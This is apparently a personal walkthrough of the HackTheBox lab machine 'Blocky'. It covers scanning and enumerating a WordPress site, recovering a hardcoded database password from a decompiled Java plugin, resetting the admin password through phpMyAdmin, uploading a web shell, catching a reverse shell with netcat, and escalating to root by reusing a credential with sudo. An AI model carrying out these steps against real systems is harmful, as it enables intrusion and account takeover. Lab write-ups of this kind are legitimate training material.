### Blocky HackTheBox

### Difficulty = Easy

### IP Address = 10.10.10.37

Nmap Scan:

```
# Nmap 7.92 scan initiated Thu Feb  2 01:38:57 2023 as: nmap -sCV -A -p21,22,80 -oN nmapscan 10.10.10.37
Nmap scan report for 10.10.10.37
Host is up (0.25s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     ProFTPD 1.3.5a
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 d6:2b:99:b4:d5:e7:53:ce:2b:fc:b5:d7:9d:79:fb:a2 (RSA)
|   256 5d:7f:38:95:70:c9:be:ac:67:a0:1e:86:e7:97:84:03 (ECDSA)
|_  256 09:d5:c2:04:95:1a:90:ef:87:56:25:97:df:83:70:67 (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-title: Did not follow redirect to http://blocky.htb
|_http-server-header: Apache/2.4.18 (Ubuntu)
Service Info: Host: 127.0.1.1; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Feb  2 01:39:15 2023 -- 1 IP address (1 host up) scanned in 18.61 seconds
```

I added blocky.htb to my /etc/hosts file

On going to the web server it shows a page
![image](https://user-images.githubusercontent.com/113513376/216232036-1cbf0755-e071-45df-a83a-1c4109e947e2.png)

Below we see some sort of message
![image](https://user-images.githubusercontent.com/113513376/216232070-17e75bd4-45e9-4947-bca0-555e8dbca16d.png)

```
Welcome everyone. The site and server are still under construction so don’t expect too much right now!
We are currently developing a wiki system for the server and a core plugin to track player stats and stuff.
Lots of great stuff planned for the future 🙂
```

Now we know that this web server uses wordpress 

To confirm i'll check wappalyzer
![image](https://user-images.githubusercontent.com/113513376/216232229-264093ad-fa84-4adf-94e4-98f60262a514.png)

I'll run wpscan 

```
┌──(mark__haxor)-[~/Desktop/B2B/HTB/Blocky]                                                                                                                                                                        
└─$ wpscan --url http://blocky.htb/                                                                                                                                                                                
_______________________________________________________________                                                                                                                                                    
         __          _______   _____                                                                                                                                                                               
         \ \        / /  __ \ / ____|                                                                                                                                                                              
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ _                                                                                                                                                             
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \                                                                                                                                                              
            \  /\  /  | |     ____) | (__| (_| | | | |                                                                                                                                                             
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|                                                                                                                                                             
                                                                                                                                                                                                                   
         WordPress Security Scanner by the WPScan Team                                                                                                                                                             
                         Version 3.8.22                                                                                                                                                                            
       Sponsored by Automattic - https://automattic.com/                                                                                                                                                           
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart                                                                                                                                                             
_______________________________________________________________                                                                                                                                                    

[+] URL: http://blocky.htb/ [10.10.10.37]                                                                                                                                                                          
[+] Started: Thu Feb  2 05:20:28 2023

Interesting Finding(s):

[+] Headers                                                                                                                                                                                                        
 | Interesting Entry: Server: Apache/2.4.18 (Ubuntu)                                                                                                                                                               
 | Found By: Headers (Passive Detection)                                                                                                                                                                           
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://blocky.htb/xmlrpc.php                                                                                                                                                      
 | Found By: Direct Access (Aggressive Detection)                                                                                                                                                                  
 | Confidence: 100%                                                                                                                                                                                                
 | References:                                                                                                                                                                                                     
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API                                                                                                                                                              
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/                                                                                                                            
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/                                                                                                                                   
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/                                                                                                                             
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://blocky.htb/readme.html                                                                                                                                                          
 | Found By: Direct Access (Aggressive Detection)                                                                                                                                                                  
 | Confidence: 100%

[+] Upload directory has listing enabled: http://blocky.htb/wp-content/uploads/                                                                                                                                    
 | Found By: Direct Access (Aggressive Detection)                                                                                                                                                                  
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://blocky.htb/wp-cron.php                                                                                                                                        
 | Found By: Direct Access (Aggressive Detection)                                                                                                                                                                  
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299
[+] WordPress version 4.8 identified (Insecure, released on 2017-06-08).
 | Found By: Rss Generator (Passive Detection)
 |  - http://blocky.htb/index.php/feed/, <generator>https://wordpress.org/?v=4.8</generator>
 |  - http://blocky.htb/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.8</generator>

[+] WordPress theme in use: twentyseventeen
 | Location: http://blocky.htb/wp-content/themes/twentyseventeen/
 | Last Updated: 2022-11-02T00:00:00.000Z
 | Readme: http://blocky.htb/wp-content/themes/twentyseventeen/README.txt
 | [!] The version is out of date, the latest version is 3.1
 | Style URL: http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8
 | Style Name: Twenty Seventeen
 | Style URI: https://wordpress.org/themes/twentyseventeen/
 | Description: Twenty Seventeen brings your site to life with header video and immersive featured images. With a fo...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.3 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://blocky.htb/wp-content/themes/twentyseventeen/style.css?ver=4.8, Match: 'Version: 1.3'

[+] Enumerating All Plugins (via Passive Methods)

[i] No plugins Found.

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:13 <====================================================================================================================================> (137 / 137) 100.00% Time: 00:00:13

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Feb  2 05:21:38 2023
[+] Requests Done: 171
[+] Cached Requests: 5
[+] Data Sent: 41.597 KB
[+] Data Received: 354.781 KB
[+] Memory used: 244.785 MB
[+] Elapsed time: 00:01:09
```

Nothing really much i'll brute force directory 

```
└─$ gobuster dir -u http://blocky.htb/ -w /usr/share/wordlists/dirb/common.txt -x php
===============================================================
Gobuster v3.2.0-dev
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://blocky.htb/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.2.0-dev
[+] Extensions:              php
[+] Timeout:                 10s
===============================================================
2023/02/02 05:34:43 Starting gobuster in directory enumeration mode
===============================================================
/javascript           (Status: 301) [Size: 313] [--> http://blocky.htb/javascript/]
/phpmyadmin           (Status: 301) [Size: 313] [--> http://blocky.htb/phpmyadmin/]
/plugins              (Status: 301) [Size: 310] [--> http://blocky.htb/plugins/]
/server-status        (Status: 403) [Size: 298]
/wiki                 (Status: 301) [Size: 307] [--> http://blocky.htb/wiki/]
/wp-admin             (Status: 301) [Size: 311] [--> http://blocky.htb/wp-admin/]
/wp-content           (Status: 301) [Size: 313] [--> http://blocky.htb/wp-content/]
/wp-includes          (Status: 301) [Size: 314] [--> http://blocky.htb/wp-includes/]
/wp-links-opml.php    (Status: 200) [Size: 219]
/wp-login.php         (Status: 200) [Size: 2397]
/wp-mail.php          (Status: 403) [Size: 3444]
/wp-trackback.php     (Status: 200) [Size: 135]
/xmlrpc.php           (Status: 405) [Size: 42]
/xmlrpc.php           (Status: 405) [Size: 42]
Progress: 9219 / 9230 (99.88%)
===============================================================
2023/02/02 05:38:11 Finished
===============================================================
```

Checking phpmyadmin shows its normal page and default cred doesn't work
![image](https://user-images.githubusercontent.com/113513376/216236702-be390fb3-e369-4969-a448-04da0046e0b3.png)

Plugins shows 2 java files
![image](https://user-images.githubusercontent.com/113513376/216237874-54ba6e04-6f5d-48bf-a58d-f99a0e0f752c.png)

I'll download them and open it using jd-gui
![image](https://user-images.githubusercontent.com/113513376/216238744-774dbcd9-0527-4fdd-b904-a41be8f9af3b.png)

```
package com.myfirstplugin;

public class BlockyCore {
  public String sqlHost = "localhost";
  
  public String sqlUser = "root";
  
  public String sqlPass = "8YsqfCTnvxAUeduzjNSXe22";
  
  public void onServerStart() {}
  
  public void onServerStop() {}
  
  public void onPlayerJoin() {
    sendMessage("TODO get username", "Welcome to the BlockyCraft!!!!!!!");
  }
  
  public void sendMessage(String username, String message) {}
}
```

So basically that looks like the phpmyadmin cred

```
Username: root
Password: 8YsqfCTnvxAUeduzjNSXe22
```

Lets try it now over the phpmyadmin
![image](https://user-images.githubusercontent.com/113513376/216239181-0f6aa253-a325-4a6e-bb39-9b49c80110af.png)

It worked cool. With this access to the phpmyadmin we can access the wordpress cred
![image](https://user-images.githubusercontent.com/113513376/216239426-b0309d40-f000-4222-961a-d84cc8fc8b7f.png)

```
SQLQuery: SELECT * FROM `wp_users`
```

So we have cred. But brute forcing might take lot of time

Since we have access we can just change the password using `mysql update` command
![image](https://user-images.githubusercontent.com/113513376/216241543-4fd8a26c-7f2b-449e-96ad-eac37f55e9e1.png)

```
SQLQuery: UPDATE `wp_users` SET user_pass = MD5('pwnerhacker') WHERE ID = 1 
```

Now we can login to wordpress using the cred below

```
Username: Notch
Password: pwnerhacker
```

![image](https://user-images.githubusercontent.com/113513376/216241757-7ae811c8-0cf8-43ad-800d-fd7c60580450.png)

So we get logged in 
![image](https://user-images.githubusercontent.com/113513376/216241793-23e0c3cf-c42b-403c-9d6d-8fcb1bd19110.png)

Now there are different ways to get shell via wordpress when the users privilege is high

But i'll just upload a plugin (a phpbash script) which when executed gives command execution
![image](https://user-images.githubusercontent.com/113513376/216242188-442f6a63-fd51-4cf4-9899-9beb6ccc39c5.png)

Now i can access it in /wp-content/uploads/2023/02/ directory
![image](https://user-images.githubusercontent.com/113513376/216242306-ec1ccebf-287f-4104-9c9a-9b1a0a565229.png)

So i'll run it now :\
![image](https://user-images.githubusercontent.com/113513376/216242385-62b4bab5-0750-46cd-b45a-0612491cb27e.png)

With this lets get a reverse shell, I used a bash reverse shell

```
└─$ nc -lvnp 1337                   
listening on [any] 1337 ...
connect to [10.10.16.7] from (UNKNOWN) [10.10.10.37] 42580
bash: cannot set terminal process group (1508): Inappropriate ioctl for device
bash: no job control in this shell
www-data@Blocky:/var/www/html/wp-content/uploads/2023/02$ 
```

Cool time to stabilize the shell

```
python3 -c "import pty; pty.spawn('/bin/bash')"
export TERM=xterm
CTRL + Z
stty raw -echo;fg
reset
```

Doing privesc took me time here cause i passed through a long way of getting shell 

Where as the cred used for loggin in to phpmyadmin works for user notch 🙂

```
User: notch
Password: 8YsqfCTnvxAUeduzjNSXe22
```

So i just switched to the next user

```
www-data@Blocky:/$ su notch 
Password: 
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

notch@Blocky:/$ id
uid=1000(notch) gid=1000(notch) groups=1000(notch),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
notch@Blocky:/$
```

The user is part of sudo group sweeet 

Now i'll see what he can run as root

```
notch@Blocky:/$ sudo -l
[sudo] password for notch: 
Matching Defaults entries for notch on Blocky:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User notch may run the following commands on Blocky:
    (ALL : ALL) ALL
notch@Blocky:/$ 
```

Cool we basically can just get root shell via this xD

```
notch@Blocky:/$ sudo su
root@Blocky:/# cd /root
root@Blocky:~# ls -al
total 28
drwx------  3 root root 4096 Jul  6  2022 .
drwxr-xr-x 23 root root 4096 Jun  2  2022 ..
-rw-------  1 root root    1 Dec 24  2017 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwx------  2 root root 4096 Jun  7  2022 .cache
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-r--------  1 root root   33 Feb  1 20:54 root.txt
root@Blocky:~# 
```

And we're done 


<br> <br>
[Back To Home](../../index.md)




